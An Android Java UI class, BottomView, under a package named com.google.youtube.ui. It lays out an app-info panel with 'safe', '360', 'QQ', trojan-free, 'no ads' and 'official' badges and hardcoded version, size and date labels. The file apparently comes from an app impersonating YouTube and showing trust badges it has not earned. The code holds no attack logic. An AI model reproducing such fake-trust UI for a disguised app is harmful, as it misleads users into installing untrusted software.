package com.google.youtube.ui;


import com.google.youtube.utils.MyHelpUtil;

import android.content.Context;
import android.graphics.Color;
import android.view.Gravity;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;

public class BottomView extends RelativeLayout {

	private ImageView imgview_safe1;

	private ImageView imgview_safe2;

	public ImageView getImgview_safe1() {
		return imgview_safe1;
	}

	public void setImgview_safe1(ImageView imgview_safe1) {
		this.imgview_safe1 = imgview_safe1;
	}

	public ImageView getImgview_safe2() {
		return imgview_safe2;
	}

	public void setImgview_safe2(ImageView imgview_safe2) {
		this.imgview_safe2 = imgview_safe2;
	}

	public ImageView getImgview_safe360() {
		return imgview_safe360;
	}

	public void setImgview_safe360(ImageView imgview_safe360) {
		this.imgview_safe360 = imgview_safe360;
	}

	public ImageView getImgview_qq() {
		return imgview_qq;
	}

	public void setImgview_qq(ImageView imgview_qq) {
		this.imgview_qq = imgview_qq;
	}

	public ImageView getImgview_gou() {
		return imgview_gou;
	}

	public void setImgview_gou(ImageView imgview_gou) {
		this.imgview_gou = imgview_gou;
	}

	public ImageView getImgview_guama_list() {
		return imgview_guama_list;
	}

	public void setImgview_guama_list(ImageView imgview_guama_list) {
		this.imgview_guama_list = imgview_guama_list;
	}

	public ImageView getImgview_locked() {
		return imgview_locked;
	}

	public void setImgview_locked(ImageView imgview_locked) {
		this.imgview_locked = imgview_locked;
	}

	public TextView getSafeTextView() {
		return safeTextView;
	}

	public void setSafeTextView(TextView safeTextView) {
		this.safeTextView = safeTextView;
	}

	public TextView getNoAdTextView() {
		return noAdTextView;
	}

	public void setNoAdTextView(TextView noAdTextView) {
		this.noAdTextView = noAdTextView;
	}

	public TextView getOfficialTextView() {
		return officialTextView;
	}

	public void setOfficialTextView(TextView officialTextView) {
		this.officialTextView = officialTextView;
	}

	public TextView getTextview_banben() {
		return textview_banben;
	}

	public void setTextview_banben(TextView textview_banben) {
		this.textview_banben = textview_banben;
	}

	public TextView getTextview_size() {
		return textview_size;
	}

	public void setTextview_size(TextView textview_size) {
		this.textview_size = textview_size;
	}

	public TextView getTextview_time() {
		return textview_time;
	}

	public void setTextview_time(TextView textview_time) {
		this.textview_time = textview_time;
	}

	public TextView getTextview_language() {
		return textview_language;
	}

	public void setTextview_language(TextView textview_language) {
		this.textview_language = textview_language;
	}

	public TextView getAppmsgTextView() {
		return appmsgTextView;
	}

	public void setAppmsgTextView(TextView appmsgTextView) {
		this.appmsgTextView = appmsgTextView;
	}

	private ImageView imgview_safe360;

	private ImageView imgview_qq;

	private ImageView imgview_gou;

	private ImageView imgview_guama_list;

	private ImageView imgview_locked;

	private TextView safeTextView;

	private TextView noAdTextView;

	private TextView officialTextView;

	private TextView textview_banben;

	private TextView textview_size;

	private TextView textview_time;

	private TextView textview_language;

	private TextView appmsgTextView;

	public BottomView(Context context) {
		super(context);
		// TODO Auto-generated constructor stub
		setId(0x194);

		this.setBackgroundColor(Color.WHITE);

		RelativeLayout.LayoutParams bottomView_LayoutParams = new RelativeLayout.LayoutParams(
				LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT);

		bottomView_LayoutParams.addRule(RelativeLayout.BELOW, 0x193);

		bottomView_LayoutParams.topMargin = 20;

		this.setLayoutParams(bottomView_LayoutParams);

		imgview_safe1 = new ImageView(context);

		LinearLayout.LayoutParams imgview_safe1_LayoutParams = new LinearLayout.LayoutParams(
				20, 35);

		imgview_safe1_LayoutParams.leftMargin = 10;

		imgview_safe1_LayoutParams.topMargin = 10;

		imgview_safe1_LayoutParams.gravity = Gravity.CENTER_VERTICAL;

		imgview_safe1.setLayoutParams(imgview_safe1_LayoutParams);

		imgview_safe1.setImageDrawable(MyHelpUtil.getDrawable(
				"img/safe_01.png", context));

		imgview_safe2 = new ImageView(context);

		imgview_safe2.setLayoutParams(imgview_safe1_LayoutParams);

		imgview_safe2.setImageDrawable(MyHelpUtil.getDrawable(
				"img/safe_02.png", context));

		imgview_safe360 = new ImageView(context);

		imgview_safe360.setLayoutParams(imgview_safe1_LayoutParams);

		imgview_safe360.setImageDrawable(MyHelpUtil.getDrawable(
				"img/safe_360.png", context));

		imgview_qq = new ImageView(context);

		imgview_qq.setLayoutParams(imgview_safe1_LayoutParams);

		imgview_qq.setImageDrawable(MyHelpUtil.getDrawable("img/safe_qq.png",
				context));

		imgview_gou = new ImageView(context);

		imgview_gou.setImageDrawable(MyHelpUtil.getDrawable("img/gou.png",
				context));

		imgview_gou.setLayoutParams(imgview_safe1_LayoutParams);

		imgview_guama_list = new ImageView(context);

		imgview_guama_list.setImageDrawable(MyHelpUtil.getDrawable(
				"img/guama_list.png", context));

		imgview_guama_list.setLayoutParams(imgview_safe1_LayoutParams);

		imgview_locked = new ImageView(context);

		imgview_locked.setImageDrawable(MyHelpUtil.getDrawable(
				"img/locked.png", context));

		imgview_locked.setLayoutParams(imgview_safe1_LayoutParams);

		safeTextView = new TextView(context);

		LinearLayout.LayoutParams safeTextViewLayoutParams = new LinearLayout.LayoutParams(
				LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);

		safeTextViewLayoutParams.leftMargin = 10;

		safeTextViewLayoutParams.topMargin = 10;

		safeTextViewLayoutParams.gravity = Gravity.CENTER_VERTICAL;

		safeTextView.setLayoutParams(safeTextViewLayoutParams);

		safeTextView.setTextColor(Color.BLACK);

		//safeTextView.setText("safe");

		noAdTextView = new TextView(context);

		noAdTextView.setLayoutParams(safeTextViewLayoutParams);

		noAdTextView.setTextColor(Color.BLACK);

		//noAdTextView.setText("no ads");

		officialTextView = new TextView(context);

		officialTextView.setLayoutParams(safeTextViewLayoutParams);

		officialTextView.setTextColor(Color.BLACK);

		//officialTextView.setText("official");

		LinearLayout title_layout = new LinearLayout(context);

		title_layout.setId(0x195);

		title_layout.setOrientation(LinearLayout.HORIZONTAL);

		LinearLayout.LayoutParams title_layout_params = new LinearLayout.LayoutParams(
				LayoutParams.MATCH_PARENT, LayoutParams.WRAP_CONTENT);

		title_layout_params.topMargin = 20;

		title_layout.setLayoutParams(title_layout_params);

		title_layout.addView(imgview_safe1);

		title_layout.addView(imgview_safe2);

		title_layout.addView(imgview_safe360);

		title_layout.addView(imgview_qq);

		title_layout.addView(imgview_gou);

		title_layout.addView(safeTextView);

		title_layout.addView(imgview_locked);

		title_layout.addView(noAdTextView);

		title_layout.addView(imgview_guama_list);

		title_layout.addView(officialTextView);

		TextView a = new TextView(context);

		a.setTextSize(18f);

		a.setTextColor(Color.BLACK);

		RelativeLayout.LayoutParams app_msg_TextView_LayoutParams = new RelativeLayout.LayoutParams(
				LayoutParams.MATCH_PARENT, LayoutParams.WRAP_CONTENT);

		app_msg_TextView_LayoutParams.addRule(RelativeLayout.CENTER_VERTICAL);

		app_msg_TextView_LayoutParams.leftMargin = 10;

		a.setLayoutParams(app_msg_TextView_LayoutParams);

		this.addView(a);

		this.addView(title_layout);

		// ----
		textview_banben = new TextView(getContext());

		textview_banben.setId(0x196);

		textview_banben.setTextSize(14f);

		//--
		textview_banben.setText("Version：4.09");

		RelativeLayout.LayoutParams textview_banben_LayoutParams = new RelativeLayout.LayoutParams(
				LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);

		textview_banben_LayoutParams.addRule(RelativeLayout.BELOW, 0x195);

		textview_banben_LayoutParams.addRule(RelativeLayout.ALIGN_PARENT_LEFT);

		textview_banben_LayoutParams.leftMargin = 25;

		textview_banben_LayoutParams.topMargin = 16;

		textview_banben.setLayoutParams(textview_banben_LayoutParams);

		// ----
		textview_size = new TextView(getContext());

		textview_size.setId(0x197);

		textview_size.setTextSize(14f);

		//---------------------------------
		textview_size.setText("Size：4.3M");

		RelativeLayout.LayoutParams textview_size_LayoutParams = new RelativeLayout.LayoutParams(
				LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);

		textview_size_LayoutParams.addRule(RelativeLayout.BELOW, 0x195);

		textview_size_LayoutParams.addRule(RelativeLayout.ALIGN_PARENT_RIGHT);

		textview_size_LayoutParams.rightMargin = 70;

		textview_size_LayoutParams.topMargin = 16;

		textview_size.setLayoutParams(textview_size_LayoutParams);

		// ------
		textview_time = new TextView(getContext());

		textview_time.setId(0x198);

		textview_time.setTextSize(14f);

		textview_time.setText("DateTime:2014-04-20");

		RelativeLayout.LayoutParams textview_time_LayoutParams = new RelativeLayout.LayoutParams(
				LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);

		textview_time_LayoutParams.addRule(RelativeLayout.BELOW, 0x196);

		textview_time_LayoutParams.addRule(RelativeLayout.ALIGN_LEFT, 0x196);

		textview_time_LayoutParams.topMargin = 18;

		textview_time.setLayoutParams(textview_time_LayoutParams);

		// -------

		textview_language = new TextView(getContext());

		textview_language.setId(0x198);

		textview_language.setTextSize(14f);

		//---
		textview_language.setText("Language：ENG");

		RelativeLayout.LayoutParams textview_language_LayoutParams = new RelativeLayout.LayoutParams(
				LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);

		textview_language_LayoutParams.addRule(RelativeLayout.BELOW, 0x197);

		textview_language_LayoutParams
				.addRule(RelativeLayout.ALIGN_LEFT, 0x197);

		textview_language_LayoutParams.topMargin = 18;

		textview_language.setLayoutParams(textview_language_LayoutParams);

		this.addView(textview_banben);

		this.addView(textview_time);

		this.addView(textview_size);

		this.addView(textview_language);

		RelativeLayout lineView = new RelativeLayout(context);

		lineView.setId(0x199);

		lineView.setBackgroundDrawable(MyHelpUtil.getDrawable("img/div.png",
				context));

		RelativeLayout.LayoutParams lineView_LayoutParams = new RelativeLayout.LayoutParams(
				LayoutParams.MATCH_PARENT, LayoutParams.WRAP_CONTENT);

		lineView_LayoutParams.addRule(RelativeLayout.BELOW, 0x198);

		lineView_LayoutParams.topMargin = 15;

		lineView.setLayoutParams(lineView_LayoutParams);

		this.addView(lineView);

		// --

		appmsgTextView = new TextView(context);

		appmsgTextView
				.setText("");

		appmsgTextView.setTextColor(Color.BLACK);

		appmsgTextView.setTextSize(14f);

		RelativeLayout.LayoutParams appmsgTextView_LayoutParams = new RelativeLayout.LayoutParams(
				LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT);

		appmsgTextView_LayoutParams.addRule(RelativeLayout.BELOW, 0x199);

		appmsgTextView_LayoutParams.topMargin = 5;
		
		appmsgTextView_LayoutParams.leftMargin = 8;
		
		appmsgTextView_LayoutParams.rightMargin = 8;

		appmsgTextView.setLayoutParams(appmsgTextView_LayoutParams);
		
		this.addView(appmsgTextView);

	}
}
